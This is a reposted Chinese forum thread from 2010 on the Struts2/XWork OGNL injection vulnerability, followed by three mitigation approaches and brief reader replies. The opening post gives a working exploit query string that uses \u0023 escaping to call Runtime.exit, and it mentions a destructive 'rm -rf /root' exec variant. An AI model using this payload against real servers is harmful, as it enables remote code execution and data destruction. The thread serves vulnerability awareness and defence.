<li><p><a href="http://www.exploit-db.com/exploits/14360/" target="_blank">http://www.exploit-db.com/exploits/14360/</a></p>
</li>
<li><a href="http://sebug.net/exploit/19954/" target="_blank">http://sebug.net/exploit/19954/</a>
Struts2的核心是使用的webwork框架，处理 action时通过调用底层的getter/setter方法来处理http的参数，它将每个http参数声明为一个ONGL（这里是ONGL的介绍）语句。当我们提交一个http参数：
?user.address.city=Bishkek&amp;user[&#39;favoriteDrink&#39;]=kumys
ONGL将它转换为：
action.getUser().getAddress().setCity(&quot;Bishkek&quot;) action.getUser().setFavoriteDrink(&quot;kumys&quot;)
这是通过ParametersInterceptor（参数过滤器）来执行的，使用用户提供的HTTP参数调用 ValueStack.setValue()。
为了防范篡改服务器端对象，XWork的ParametersInterceptor不允许参数名中出现“/#”字符，但如果使用了Java的 unicode字符串表示\u0023，攻击者就可以绕过保护，修改保护Java方式执行的值：
此处代码有破坏性，请在测试环境执行，严禁用此种方法进行恶意攻击
?(&#39;\u0023_memberAccess[\&#39;allowStaticMethodAccess\&#39;]&#39;)(meh)=true&amp;(aaa)((&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003d\u0023foo&#39;)(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#39;\u0023rt.exit(1)&#39;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1
转义后是这样：
?(&#39;/#_memberAccess[&#39;allowStaticMethodAccess&#39;]&#39;)(meh)=true&amp;(aaa)((&#39;/#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=/#foo&#39;)(/#foo=new%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#39;/#rt.exit(1)&#39;)(/#rt=@java.lang.Runtime@getRuntime()))=1
OGNL处理时最终的结果就是java.lang.Runtime.getRuntime().exit(1);
类似的可以执行java.lang.Runtime.getRuntime().exec(&quot;rm –rf /root&quot;)，只要有权限就可以删除任何一个目录。
目前尝试了3个解决方案：
<strong>1.升级到struts2.2版本。</strong>
这个可以避免这个问题，但是struts开发团队没有release这个版本（包括最新的2.2.1版本都没有release），经我测试发现新版本虽然解决了上述的漏洞，但是新的问题是strus标签出问题了。
<s:bean id="UserUtil" name="cn.com.my_corner.util.UserUtil"></s:bean> <s:property value="/#UserUtil.getType().get(cType.toString())" />
这样的标签在struts2.0中是可以使用的，但是新版中就不解析了，原因就是“/#”的问题导致的，补了漏洞，正常的使用也用不了了。
所以sebug网站上的建议升级到2.2版本是不可行的。
<strong>2.struts参数过滤。</strong>
<interceptor-ref name="params"> <param name="excludeParams">./<em>\u0023./</em></param> </interceptor-ref>
这个可以解决漏洞问题，缺点是工作量大，每个项目都得改struts配置文件。如果项目里，是引用的一个类似global.xml的配置文件，工作量相应减少一些。
<strong>3.在前端请求进行过滤。</strong>
比如在ngnix，apache进行拦截，参数中带有\u0023的一律视为攻击，跳转到404页面或者别的什么页面。这样做的一个前提就是没人把/#号转码后作为参数传递。
目前来看后两种是比较有效的方法，采用第三种方法比较简便。是否有另外的解决办法，欢迎大家讨论。
我并没有在windows环境下测试，有同学在windows下没有试验成功，这并不能说明windows下就没有风险可能是我们的参数或者什么地方有问题而已。既然漏洞的确存在，咱们就要重视对吧。欢迎大家测试，是否windows下漏洞不能执行成功。
声明：JavaEye文章版权属于作者，受法律保护。没有作者书面许可不得转载。</li>
</ul>
<p>推荐链接</p>
<ul>
<li><a href="http://www.javaeye.com/clicks/373" target="_blank"><img src="&quot;adobe&quot;" alt="adobe"></a> <a href="http://www.javaeye.com/topic/720209#" target="_blank">返回顶楼</a> <a href="http://my-corner.javaeye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://my-corner.javaeye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://app.javaeye.com/messages/new?message%5Breceiver_name%5D=my_corner" title="发送站内短信" target="_blank"> </a> <a href="http://my-corner.javaeye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://app.javaeye.com/feed?subscription%5Bsubscribed_user_name%5D=my_corner" title="关注作者" target="_blank"> </a>  * my_corner</li>
<li>等级: <img src="&quot;一星会员&quot;" alt="一星会员"></li>
<li><a href="http://my-corner.javaeye.com/" target="_blank"><img src="&quot;my_corner的博客: 我的角落&quot;" alt="my_corner的博客"></a></li>
<li>文章: 96</li>
<li>积分: 130</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2010-07-24  </li>
</ul>
<p>这三种方法，均已通过测试 <a href="http://www.javaeye.com/topic/720209#" target="_blank">返回顶楼</a> <a href="http://my-corner.javaeye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://my-corner.javaeye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://app.javaeye.com/messages/new?message%5Breceiver_name%5D=my_corner" title="发送站内短信" target="_blank"> </a> <a href="http://my-corner.javaeye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://app.javaeye.com/feed?subscription%5Bsubscribed_user_name%5D=my_corner" title="关注作者" target="_blank"> </a> <a href="http://www.javaeye.com/topic/720209#1593723" title="my_corner回帖:Struts2/XWork 安全漏洞及解决办法" target="_blank">回帖地址</a></p>
<p><a href="http://www.javaeye.com/topic/720209#" title="好" target="_blank">0</a> <a href="http://www.javaeye.com/topic/720209#" title="差" target="_blank">0</a> 请登录后投票  * KimShen</p>
<ul>
<li>等级: 初级会员</li>
<li><a href="http://kimshen.javaeye.com/" target="_blank"><img src="&quot;KimShen的博客: 马丁大人,您也就这种把戏了.得。您继续自我感觉良好去吧&quot;" alt="KimShen的博客"></a></li>
<li>文章: 168</li>
<li>积分: 0</li>
<li>来自: 上海</li>
<li><img src="" alt="">
  发表时间：2010-07-24  </li>
</ul>
<p>我们也是用的struts2,突然看到 特此登陆 谢谢LZ提醒.这个漏洞可以定义为破坏级了 <a href="http://www.javaeye.com/topic/720209#" target="_blank">返回顶楼</a> <a href="http://kimshen.javaeye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://kimshen.javaeye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://app.javaeye.com/messages/new?message%5Breceiver_name%5D=KimShen" title="发送站内短信" target="_blank"> </a> <a href="http://kimshen.javaeye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://app.javaeye.com/feed?subscription%5Bsubscribed_user_name%5D=KimShen" title="关注作者" target="_blank"> </a> <a href="http://www.javaeye.com/topic/720209#1594228" title="KimShen回帖:Struts2/XWork 安全漏洞及解决办法" target="_blank">回帖地址</a></p>
<p><a href="http://www.javaeye.com/topic/720209#" title="好" target="_blank">0</a> <a href="http://www.javaeye.com/topic/720209#" title="差" target="_blank">0</a> 请登录后投票  * rustlingwind</p>
<ul>
<li>等级: 初级会员</li>
<li><a href="http://rustlingwind.javaeye.com/" target="_blank"><img src="&quot;rustlingwind的博客: 马鸣风萧萧&quot;" alt="rustlingwind的博客"></a></li>
<li>文章: 6</li>
<li>积分: 30</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2010-07-25  </li>
</ul>
<p>貌似 struts2 现在已经基本没人维护了。已经没有生命力的项目，现在还有人用？ <a href="http://www.javaeye.com/topic/720209#" target="_blank">返回顶楼</a> <a href="http://rustlingwind.javaeye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://rustlingwind.javaeye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://app.javaeye.com/messages/new?message%5Breceiver_name%5D=rustlingwind" title="发送站内短信" target="_blank"> </a> <a href="http://rustlingwind.javaeye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://app.javaeye.com/feed?subscription%5Bsubscribed_user_name%5D=rustlingwind" title="关注作者" target="_blank"> </a> <a href="http://www.javaeye.com/topic/720209#1594572" title="rustlingwind回帖:Struts2/XWork 安全漏洞及解决办法" target="_blank">回帖地址</a></p>
<p><a href="http://www.javaeye.com/topic/720209#" title="好" target="_blank">0</a> <a href="http://www.javaeye.com/topic/720209#" title="差" target="_blank">0</a> 请登录后投票  * swanky_yao</p>
<ul>
<li>等级: 初级会员</li>
<li><a href="http://swanky-yao.javaeye.com/" target="_blank"><img src="&quot;swanky_yao的博客: javaEye Fans&quot;" alt="swanky_yao的博客"></a></li>
<li>文章: 21</li>
<li>积分: 90</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2010-07-25  </li>
</ul>
<p>靠 这么严重 我还如此看好它... <a href="http://www.javaeye.com/topic/720209#" target="_blank">返回顶楼</a> <a href="http://swanky-yao.javaeye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://swanky-yao.javaeye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://app.javaeye.com/messages/new?message%5Breceiver_name%5D=swanky_yao" title="发送站内短信" target="_blank"> </a> <a href="http://swanky-yao.javaeye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://app.javaeye.com/feed?subscription%5Bsubscribed_user_name%5D=swanky_yao" title="关注作者" target="_blank"> </a> <a href="http://www.javaeye.com/topic/720209#1594599" title="swanky_yao回帖:Struts2/XWork 安全漏洞及解决办法" target="_blank">回帖地址</a></p>
<p><a href="http://www.javaeye.com/topic/720209#" title="好" target="_blank">0</a> <a href="http://www.javaeye.com/topic/720209#" title="差" target="_blank">0</a> 请登录后投票  * my_corner</p>
<ul>
<li>等级: <img src="&quot;一星会员&quot;" alt="一星会员"></li>
<li><a href="http://my-corner.javaeye.com/" target="_blank"><img src="&quot;my_corner的博客: 我的角落&quot;" alt="my_corner的博客"></a></li>
<li>文章: 96</li>
<li>积分: 130</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2010-07-25  </li>
</ul>
<p>rustlingwind 写道</p>
<p>貌似 struts2 现在已经基本没人维护了。已经没有生命力的项目，现在还有人用？
没人维护？老兄，错了吧。struts2是webwork交给apache基金会重新包装出来的，核心代码还是webwork。你是说的webwork没人维护了吧。 <a href="http://www.javaeye.com/topic/720209#" target="_blank">返回顶楼</a> <a href="http://my-corner.javaeye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://my-corner.javaeye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://app.javaeye.com/messages/new?message%5Breceiver_name%5D=my_corner" title="发送站内短信" target="_blank"> </a> <a href="http://my-corner.javaeye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://app.javaeye.com/feed?subscription%5Bsubscribed_user_name%5D=my_corner" title="关注作者" target="_blank"> </a> <a href="http://www.javaeye.com/topic/720209#1594638" title="my_corner回帖:Struts2/XWork 安全漏洞及解决办法" target="_blank">回帖地址</a></p>
<p><a href="http://www.javaeye.com/topic/720209#" title="好" target="_blank">0</a> <a href="http://www.javaeye.com/topic/720209#" title="差" target="_blank">0</a> 请登录后投票  * my_corner</p>
<ul>
<li>等级: <img src="&quot;一星会员&quot;" alt="一星会员"></li>
<li><a href="http://my-corner.javaeye.com/" target="_blank"><img src="&quot;my_corner的博客: 我的角落&quot;" alt="my_corner的博客"></a></li>
<li>文章: 96</li>
<li>积分: 130</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2010-07-25  </li>
</ul>
<p>swanky_yao 写道</p>
<p>靠 这么严重 我还如此看好它...
呵呵，哪有绝对安全的东西呀，这都是随着时间逐渐暴露出来的。当然，主要是无聊的人太多了，找漏洞 <a href="http://www.javaeye.com/topic/720209#" target="_blank">返回顶楼</a> <a href="http://my-corner.javaeye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://my-corner.javaeye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://app.javaeye.com/messages/new?message%5Breceiver_name%5D=my_corner" title="发送站内短信" target="_blank"> </a> <a href="http://my-corner.javaeye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://app.javaeye.com/feed?subscription%5Bsubscribed_user_name%5D=my_corner" title="关注作者" target="_blank"> </a> <a href="http://www.javaeye.com/topic/720209#1594643" title="my_corner回帖:Struts2/XWork 安全漏洞及解决办法" target="_blank">回帖地址</a></p>
<p><a href="http://www.javaeye.com/topic/720209#" title="好" target="_blank">0</a> <a href="http://www.javaeye.com/topic/720209#" title="差" target="_blank">0</a> 请登录后投票  * my_corner</p>
<ul>
<li>等级: <img src="&quot;一星会员&quot;" alt="一星会员"></li>
<li><a href="http://my-corner.javaeye.com/" target="_blank"><img src="&quot;my_corner的博客: 我的角落&quot;" alt="my_corner的博客"></a></li>
<li>文章: 96</li>
<li>积分: 130</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2010-07-25  </li>
</ul>
<p>KimShen 写道</p>
<p>我们也是用的struts2,突然看到 特此登陆 谢谢LZ提醒.这个漏洞可以定义为破坏级了
呵呵，<img src="" alt=""> <a href="http://www.javaeye.com/topic/720209#" target="_blank">返回顶楼</a> <a href="http://my-corner.javaeye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://my-corner.javaeye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://app.javaeye.com/messages/new?message%5Breceiver_name%5D=my_corner" title="发送站内短信" target="_blank"> </a> <a href="http://my-corner.javaeye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://app.javaeye.com/feed?subscription%5Bsubscribed_user_name%5D=my_corner" title="关注作者" target="_blank"> </a> <a href="http://www.javaeye.com/topic/720209#1594655" title="my_corner回帖:Struts2/XWork 安全漏洞及解决办法" target="_blank">回帖地址</a></p>
<p><a href="http://www.javaeye.com/topic/720209#" title="好" target="_blank">0</a> <a href="http://www.javaeye.com/topic/720209#" title="差" target="_blank">1</a> 请登录后投票  * 三问飞絮</p>
<ul>
<li>等级: 初级会员</li>
<li><a href="http://simon-fish.javaeye.com/" target="_blank"><img src="&quot;三问飞絮的博客: 三问飞絮&quot;" alt="三问飞絮的博客"></a></li>
<li>文章: 25</li>
<li>积分: 50</li>
<li>来自: 福建</li>
<li><img src="" alt="">
  发表时间：2010-07-25  </li>
</ul>
<p>my_corner 写道</p>
<p>swanky_yao 写道</p>
<p>靠 这么严重 我还如此看好它...
呵呵，哪有绝对安全的东西呀，这都是随着时间逐渐暴露出来的。当然，主要是无聊的人太多了，找漏洞
这种无聊倒是精神可嘉！ <a href="http://www.javaeye.com/topic/720209#" target="_blank">返回顶楼</a> <a href="http://simon-fish.javaeye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://simon-fish.javaeye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://app.javaeye.com/messages/new?message%5Breceiver_name%5D=%E4%B8%89%E9%97%AE%E9%A3%9E%E7%B5%AE" title="发送站内短信" target="_blank"> </a> <a href="http://simon-fish.javaeye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://app.javaeye.com/feed?subscription%5Bsubscribed_user_name%5D=%E4%B8%89%E9%97%AE%E9%A3%9E%E7%B5%AE" title="关注作者" target="_blank"> </a> <a href="http://www.javaeye.com/topic/720209#1594732" title="三问飞絮回帖:Struts2/XWork 安全漏洞及解决办法" target="_blank">回帖地址</a></p>
<p><a href="http://www.javaeye.com/topic/720209#" title="好" target="_blank">0</a> <a href="http://www.javaeye.com/topic/720209#" title="差" target="_blank">1</a> 请登录后投票  * my_corner</p>
<ul>
<li>等级: <img src="&quot;一星会员&quot;" alt="一星会员"></li>
<li><a href="http://my-corner.javaeye.com/" target="_blank"><img src="&quot;my_corner的博客: 我的角落&quot;" alt="my_corner的博客"></a></li>
<li>文章: 96</li>
<li>积分: 130</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2010-07-25  </li>
</ul>
<p>三问飞絮 写道</p>
<p>my_corner 写道</p>
<p>swanky_yao 写道</p>
<p>靠 这么严重 我还如此看好它...
呵呵，哪有绝对安全的东西呀，这都是随着时间逐渐暴露出来的。当然，主要是无聊的人太多了，找漏洞
这种无聊倒是精神可嘉！
呵呵，攻击别人满足自己的虚荣呗。一般都是练手的，不过也有花钱攻击竞争对手的。
<img src="" alt="">  扯得有点远了。
大家还有什么更好的方法，分享…… <a href="http://www.javaeye.com/topic/720209#" target="_blank">返回顶楼</a> <a href="http://my-corner.javaeye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://my-corner.javaeye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://app.javaeye.com/messages/new?message%5Breceiver_name%5D=my_corner" title="发送站内短信" target="_blank"> </a> <a href="http://my-corner.javaeye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://app.javaeye.com/feed?subscription%5Bsubscribed_user_name%5D=my_corner" title="关注作者" target="_blank"> </a> <a href="http://www.javaeye.com/topic/720209#1594751" title="my_corner回帖:Struts2/XWork 安全漏洞及解决办法" target="_blank">回帖地址</a></p>
<p><a href="http://www.javaeye.com/topic/720209#" title="好" target="_blank">0</a> <a href="http://www.javaeye.com/topic/720209#" title="差" target="_blank">0</a> 请登录后投票</p>
<p><a href="http://www.javaeye.com/forums/39/topics/720209/posts/new" title="发表回复"></a></p>
<p>« 上一页 1 <a href="http://www.javaeye.com/topic/720209?page=2" target="_blank">2</a> <a href="http://www.javaeye.com/topic/720209?page=3" target="_blank">3</a> … <a href="http://www.javaeye.com/topic/720209?page=6" target="_blank">6</a> <a href="http://www.javaeye.com/topic/720209?page=7" target="_blank">7</a> <a href="http://www.javaeye.com/topic/720209?page=2" target="_blank">下一页 »</a>
<a href="http://www.javaeye.com/forums" target="_blank">论坛首页</a> → <a href="http://www.javaeye.com/forums/board/Java" target="_blank">Java编程和Java企业应用版</a> → <a href="http://www.javaeye.com/forums/tag/Struts" target="_blank">Struts</a>
跳转论坛:Java编程和Java企业应用 Web前端技术 移动编程和手机应用开发 C/C++编程 Ruby编程 Python编程 PHP编程 Flash编程和RIA Microsoft .Net 综合技术 软件开发和项目管理 行业应用 入门讨论 招聘求职 海阔天空</p>
<ul>
<li><a href="http://www.javaeye.com/jobs/712" title="北京:JavaEye猎头诚聘Java搜索工程师" target="_blank">北京: JavaEye猎头诚聘Java搜索工程师</a></li>
<li><a href="http://www.javaeye.com/jobs/779" title="浙江:VMKID诚聘Java开发工程师(J2SE)（Client端方向）" target="_blank">浙江: VMKID诚聘Java开发工程师(J2SE)（Client端方</a></li>
<li><a href="http://www.javaeye.com/jobs/523" title="北京:去哪儿旅游搜索引擎诚聘java开发工程师" target="_blank">北京: 去哪儿旅游搜索引擎诚聘java开发工程师</a></li>
<li><a href="http://www.javaeye.com/jobs/769" title="北京:掌中魔力诚聘java资深工程师" target="_blank">北京: 掌中魔力诚聘java资深工程师</a></li>
<li><a href="http://www.javaeye.com/jobs/728" title="北京:chinacache诚聘Java应用架构师" target="_blank">北京: chinacache诚聘Java应用架构师</a></li>
<li><a href="http://www.javaeye.com/jobs/839" title="北京:glodon诚聘Eclipse插件开发工程师" target="_blank">北京: glodon诚聘Eclipse插件开发工程师</a></li>
<li><a href="http://www.javaeye.com/jobs/800" title="北京:网易（NETEASE）诚聘高级Java开发工程师" target="_blank">北京: 网易（NETEASE）诚聘高级Java开发工程师</a></li>
<li><a href="http://www.javaeye.com/jobs/804" title="福建:福州几维网络诚聘游戏服务端程序员(Java)" target="_blank">福建: 福州几维网络诚聘游戏服务端程序员(Java)</a></li>
<li><a href="http://www.javaeye.com/jobs/817" title="北京:Laszlo Systems 诚聘高级Java程序员" target="_blank">北京: Laszlo Systems 诚聘高级Java程序员</a></li>
<li><a href="http://www.javaeye.com/jobs/838" title="上海:BShare诚聘资深Java Web开发工程师" target="_blank">上海: BShare诚聘资深Java Web开发工程师</a></li>
<li><a href="http://www.javaeye.com/jobs/794" title="广东:穆迪moody&#39;s诚聘Java Developer" target="_blank">广东: 穆迪moody&#39;s诚聘Java Developer</a></li>
<li><a href="http://www.javaeye.com/jobs/825" title="上海:上海汉得诚聘高级基础架构研发工程师——IDE方向" target="_blank">上海: 上海汉得诚聘高级基础架构研发工程师——IDE</a></li>
<li><a href="http://www.javaeye.com/jobs/682" title="上海:恺英网络诚聘JS工程师" target="_blank">上海: 恺英网络诚聘JS工程师</a></li>
<li><a href="http://www.javaeye.com/jobs/806" title="北京:上海幽幽诚聘手机网游服务器端开发工程师" target="_blank">北京: 上海幽幽诚聘手机网游服务器端开发工程师</a></li>
<li><p><a href="http://www.javaeye.com/jobs/726" title="北京:chinacache诚聘高级Java开发工程师（后台应用）" target="_blank">北京: chinacache诚聘高级Java开发工程师（后台应用</a></p>
</li>
<li><p><a href="http://www.javaeye.com/" target="_blank">首页</a></p>
</li>
<li><a href="http://www.javaeye.com/news" target="_blank">新闻</a></li>
<li><a href="http://www.javaeye.com/forums" target="_blank">论坛</a></li>
<li><a href="http://www.javaeye.com/ask" target="_blank">问答</a></li>
<li><a href="http://www.javaeye.com/wiki" target="_blank">专栏</a></li>
<li><a href="http://www.javaeye.com/blogs" target="_blank">博客</a></li>
<li><a href="http://www.javaeye.com/groups" target="_blank">圈子</a></li>
<li><a href="http://www.javaeye.com/job" target="_blank">招聘</a></li>
<li><a href="http://www.javaeye.com/index/service" target="_blank">服务</a></li>
<li><a href="http://www.javaeye.com/search" target="_blank">搜索</a></li>
<li><a href="http://java.javaeye.com/" target="_blank">Java</a></li>
<li><a href="http://webapp.javaeye.com/" target="_blank">Web</a></li>
<li><a href="http://ruby.javaeye.com/" target="_blank">Ruby</a></li>
<li><a href="http://python.javaeye.com/" target="_blank">Python</a></li>
<li><a href="http://agile.javaeye.com/" target="_blank">敏捷</a></li>
<li><a href="http://mysql.javaeye.com/" target="_blank">MySQL</a></li>
<li><a href="http://runqian.javaeye.com/" target="_blank">润亁报表</a></li>
<li><a href="http://book.javaeye.com/" target="_blank">图书</a></li>
<li><a href="http://www.javaeye.com/index/service" target="_blank">广告服务</a></li>
<li><a href="http://webmaster.javaeye.com/" target="_blank">JavaEye黑板报</a></li>
<li><a href="http://www.javaeye.com/index/aboutus" target="_blank">关于我们</a></li>
<li><a href="http://www.javaeye.com/index/contactus" target="_blank">联系我们</a></li>
<li><a href="http://www.javaeye.com/index/friend_links" target="_blank">友情链接</a></li>
</ul>
<p>© 2003-2010 JavaEye.com. 上海炯耐计算机软件有限公司版权所有 [ <a href="http://www.miibeian.gov.cn/" target="_blank">沪ICP备05023328号</a> ]</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/Java/">Java</a></li></span></span> | <span class="tags">Tagged <a href="/tags/Java/" class="label label-primary">Java</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-Java--Struts2-XWork安全漏洞及解决办法/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-Java--Struts2-XWork安全漏洞及解决办法" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/92/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/90/">90</a></li><li><a class="page-number" href="/page/91/">91</a></li><li><a class="page-number" href="/page/92/">92</a></li><li class="active"><li><span class="page-number current">93</span></li><li><a class="page-number" href="/page/94/">94</a></li><li><a class="page-number" href="/page/95/">95</a></li><li><a class="page-number" href="/page/96/">96</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/164/">164</a></li><li><a class="page-number" href="/page/165/">165</a></li><li><a class="extend next" href="/page/94/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>正在加载...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">最近更新</div>  <div data-src='latest_update_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?1442f50724afc42380b51f097c43082c"});
</script>
</span>  </div>
  <div id="copyright">Blog powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a> Theme <strong><a href='https://github.com/chenall/hexo-theme-chenall'>chenall</a></strong>(Some change in it)<span class="pull-right"> 更新时间: <em>2014-03-15 15:12:18</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
